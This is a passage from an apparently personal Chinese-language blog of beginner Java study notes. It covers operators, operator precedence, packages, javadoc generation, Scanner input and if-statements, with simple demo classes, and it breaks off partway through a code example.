<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo07</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> PI=<span class="number">3.14</span>;</span><br><span class="line">    <span class="comment">//static final修饰符，不分前后顺序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(PI);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="变量命名规范">
          <a href="#变量命名规范" class="heading-link"><i class="fas fa-link"></i></a><a href="#变量命名规范" class="headerlink" title="变量命名规范"></a>变量命名规范</h3>
      <p>所有变量，方法，雷名：见名知意</p>
<p>类成员变量：首字母小写和驼峰原则：monthSalary 出了第一个字母以外后面每隔字符首字母大写</p>
<p>局部变量：首字母小写和驼峰原则</p>
<p>常量：大写字母和下划线MAX_VALUE</p>
<p>类名：首字母大写和驼峰原则</p>
<p>方法名：首字母小写he驼峰原则</p>

        <h3 id="运算符">
          <a href="#运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3>
      <p>算术运算符:+， -，*，l，%，++， –</p>
<p>赋值运算符&#x3D;<br>关系运算符:&gt;，&lt;，&gt;&#x3D;，&#x3D;，&#x3D;&#x3D;，!&#x3D; instanceof</p>
<p>逻辑运算符: &amp;&amp;，||，!<br>位运算符:&amp;，|，^，~，&gt;&gt;，&lt;&lt;，&gt;&gt;&gt;(了解! ! ! )条件运算符?︰<br>扩展赋值运算符:+&#x3D;，-&#x3D;，*&#x3D;，&#x2F;&#x3D;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo01 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=20;</span><br><span class="line">        int c=25;</span><br><span class="line">        int d=25;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(a-b);</span><br><span class="line">        System.out.println(a*b);</span><br><span class="line">        System.out.println(a/(double)b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo02 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        long a=123124151123L;</span><br><span class="line">        int b=123;</span><br><span class="line">        short c= 10;</span><br><span class="line">        byte d=8;</span><br><span class="line">        System.out.println(a+b+c+d);//long</span><br><span class="line">        System.out.println(b+c+d);//int</span><br><span class="line">        System.out.println(c+d);//int</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo03 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //关系运算符返回的结果： 正确 错误  布尔值</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=2;</span><br><span class="line">        int c=21;</span><br><span class="line">        System.out.println(c%a);</span><br><span class="line">        System.out.println(a&gt;b);</span><br><span class="line">        System.out.println(a&lt;b);</span><br><span class="line">        System.out.println(a==b);</span><br><span class="line">        System.out.println(a!=b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="自增运算符">
          <a href="#自增运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#自增运算符" class="headerlink" title="自增运算符"></a>自增运算符</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.ls.LSOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//++  --   自增  自减  一元运算符</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> b=a++;<span class="comment">//执行完这行代码后，先给b赋值，在自增</span></span><br><span class="line">        <span class="comment">//a=a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span>++a;<span class="comment">//执行这段代码，先自增，再给b赋值</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        <span class="comment">//幂运算  2^3  运用Math类工具</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="位运算符">
          <a href="#位运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * A=0011 1100</span></span><br><span class="line"><span class="comment">        * B=0000 1101</span></span><br><span class="line"><span class="comment">        * A&amp;B=0000 1100</span></span><br><span class="line"><span class="comment">        * A|b=0011 1101</span></span><br><span class="line"><span class="comment">        * A^B=0011 0010</span></span><br><span class="line"><span class="comment">        * ~B=111 0010</span></span><br><span class="line"><span class="comment">        *2*8=16 2*2*2*2</span></span><br><span class="line"><span class="comment">        *&lt;&lt; *2   &gt;&gt; /2</span></span><br><span class="line"><span class="comment">        * 位运算  效率高！！！</span></span><br><span class="line"><span class="comment">        0000 0000  0</span></span><br><span class="line"><span class="comment">        0000 0001  1</span></span><br><span class="line"><span class="comment">        0000 0010  2</span></span><br><span class="line"><span class="comment">        0000 0100  4</span></span><br><span class="line"><span class="comment">        0000 1000  8</span></span><br><span class="line"><span class="comment">        0001 0000  16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        System.out.println(<span class="number">2</span>&lt;&lt;<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="三元运算符">
          <a href="#三元运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">20</span>;</span><br><span class="line">        a+=b;<span class="comment">//a=a+b</span></span><br><span class="line">        a-=b;<span class="comment">//a=a-b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//字符串连接符 +  String</span></span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+a+b);</span><br><span class="line">        System.out.println(a+b+<span class="string">&quot;&quot;</span>);<span class="comment">//先运算加在和字符串相加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//x?y:z</span></span><br><span class="line">        <span class="comment">//如果x==true ，则结果为y，否则结果为z</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">80</span>;</span><br><span class="line">        String type=score&lt;<span class="number">60</span>?<span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line">        System.out.println(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="运算优先级">
          <a href="#运算优先级" class="heading-link"><i class="fas fa-link"></i></a><a href="#运算优先级" class="headerlink" title="运算优先级"></a>运算优先级</h4>
      <div class="table-container"><table>
<thead>
<tr>
<th>类别</th>
<th>操作符</th>
<th>关联性</th>
</tr>
</thead>
<tbody><tr>
<td>后缀</td>
<td>() [] . (点操作符)</td>
<td>左到右</td>
</tr>
<tr>
<td>一元</td>
<td>expr++  expr–</td>
<td>从左到右</td>
</tr>
<tr>
<td>一元</td>
<td>++expr –expr + - ～ ！</td>
<td>从右到左</td>
</tr>
<tr>
<td>乘性</td>
<td>* &#x2F;％</td>
<td>左到右</td>
</tr>
<tr>
<td>加性</td>
<td>+ -</td>
<td>左到右</td>
</tr>
<tr>
<td>移位</td>
<td>&gt;&gt; &gt;&gt;&gt;  &lt;&lt;</td>
<td>左到右</td>
</tr>
<tr>
<td>关系</td>
<td>&gt;  &gt;&#x3D;  &lt;  &lt;&#x3D;</td>
<td>左到右</td>
</tr>
<tr>
<td>相等</td>
<td>&#x3D;&#x3D; !&#x3D;</td>
<td>左到右</td>
</tr>
<tr>
<td>按位与</td>
<td>＆</td>
<td>左到右</td>
</tr>
<tr>
<td>按位异或</td>
<td>^</td>
<td>左到右</td>
</tr>
<tr>
<td>按位或</td>
<td>|</td>
<td>左到右</td>
</tr>
<tr>
<td>逻辑与</td>
<td>&amp;&amp;</td>
<td>左到右</td>
</tr>
<tr>
<td>逻辑或</td>
<td>| |</td>
<td>左到右</td>
</tr>
<tr>
<td>条件</td>
<td>？：</td>
<td>从右到左</td>
</tr>
<tr>
<td>赋值</td>
<td>&#x3D; + &#x3D; - &#x3D; * &#x3D; &#x2F; &#x3D;％&#x3D; &gt;&gt; &#x3D; &lt;&lt; &#x3D;＆&#x3D; ^ &#x3D; | &#x3D;</td>
<td>从右到左</td>
</tr>
<tr>
<td>逗号</td>
<td>，</td>
<td>左到右</td>
</tr>
</tbody></table></div>

        <h3 id="包机制">
          <a href="#包机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h3>
      <p>为了更好的组织类，java提供了包机制，用于区别类名的命名空间。</p>
<p>包语句的语法格式为：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[.pkg2[.pkg3...]];</span><br></pre></td></tr></table></div></figure>

<p>一班利用公司域名倒置作为包名；</p>
<p>为了能够使用某一个包的成员，我们需要在java程序中明确导入该包。使用“import”完成此功能</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">package</span>[.package2...].(ckassname|*);</span><br></pre></td></tr></table></div></figure>

<p>包就像文件夹一样</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230822160255214-1698627034979-7.png"></p>

        <h3 id="javaDoc">
          <a href="#javaDoc" class="heading-link"><i class="fas fa-link"></i></a><a href="#javaDoc" class="headerlink" title="javaDoc"></a>javaDoc</h3>
      <p>javaDoc命令是用来生成自己Api文档的</p>

        <h4 id="命令行生成javadoc文档">
          <a href="#命令行生成javadoc文档" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令行生成javadoc文档" class="headerlink" title="命令行生成javadoc文档"></a>命令行生成javadoc文档</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> Demo.java</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164523717.png"></p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164535066.png"></p>
<p>点开index.html</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164554989.png"></p>

        <h4 id="IDEA生成javadoc文档">
          <a href="#IDEA生成javadoc文档" class="heading-link"><i class="fas fa-link"></i></a><a href="#IDEA生成javadoc文档" class="headerlink" title="IDEA生成javadoc文档"></a>IDEA生成javadoc文档</h4>
      <p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192435394.png"></p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192453952.png"></p>
<p>第一步：选择生成JavaDoc文档的范围，我只对一个源文件生成Doc，所以选择文件。<br>第二步：输出目录最好新建一个文件夹，比较有条理和整洁<br>第三步：区域设置，决定文档的语言，简体中文就是zh_CN、繁体(台湾)zh_tw、繁体(香港)zh-hk、英语(香港)en-hk、英语(美国)en-us、英语(英国)en-gb、英语(全球)en-ww<br>第四步：其他命令行参数：如果区域设置为中国，参数一般为-encoding UTF-8 -charset UTF-8<br>第五步：设置完成后点击确定即可生成Doc文档</p>

        <h2 id="Java流程控制">
          <a href="#Java流程控制" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h2>
      <p>###Scanner对象</p>
<p>基本语法</p>
<p>Scanner  s &#x3D;new Scanner（System.in)</p>
<p>通过Scanner 类的next（）与newxtLine()方法获取输入的字符串，在读取钱我们一般需要是hasNext()与NextLine（）判断是否还有输入的数据</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建一个扫描器对象，用于接受键盘数据</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户有没有输入字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="comment">//使用next方式及接收</span></span><br><span class="line">             <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容为：&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//凡是输入IO流的类如果不关闭会一直占用资源，要养成良好的习惯用完就关闭</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="next-与-nextLine-区别">
          <a href="#next-与-nextLine-区别" class="heading-link"><i class="fas fa-link"></i></a><a href="#next-与-nextLine-区别" class="headerlink" title="next() 与 nextLine() 区别"></a>next() 与 nextLine() 区别</h3>
      <p>next():</p>
<ul>
<li>1、一定要读取到有效字符后才可以结束输入。</li>
<li>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。</li>
<li>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。 </li>
<li>next() 不能得到带有空格的字符串。</li>
</ul>
<p>nextLine()： </p>
<ul>
<li>1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。 </li>
<li>2、可以获得空白。</li>
</ul>
<p>如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持，但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//判断是否还有输入</span></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入数据为：&quot;</span>+str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//我们要输入多个数字，并求其总和和平均数，没输入一个数字回车确认，通过输入非数字来结束并输出结果</span></span><br><span class="line">    Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//计算输入了多少个数字</span></span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过循环判断是否还有输入，并在里面每一次进行求和和统计</span></span><br><span class="line">    <span class="keyword">while</span>(scanner.hasNextDouble()) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">        m = m + <span class="number">1</span>;</span><br><span class="line">        sum = sum + x;</span><br><span class="line">        System.out.println(<span class="string">&quot;你输入了第&quot;</span>+m+<span class="string">&quot;个数据&quot;</span>+<span class="string">&quot;,然后当前数据是&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数的和为&quot;</span>+sum);</span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数的平均值是&quot;</span>+(sum/m));</span><br><span class="line">    scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="顺序结构">
          <a href="#顺序结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h3>
      <p>代码依次执行的结构</p>
<p>任何一种结构的基本结构</p>

        <h3 id="if选择结构">
          <a href="#if选择结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#if选择结构" class="headerlink" title="if选择结构"></a>if选择结构</h3>
      <p>语法：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式成立会怎么样</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式成立会怎么样</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (布尔表达式<span class="number">3</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230823092226066.png" alt="image-20230823092226066"></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IFDemo03</span>  &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title 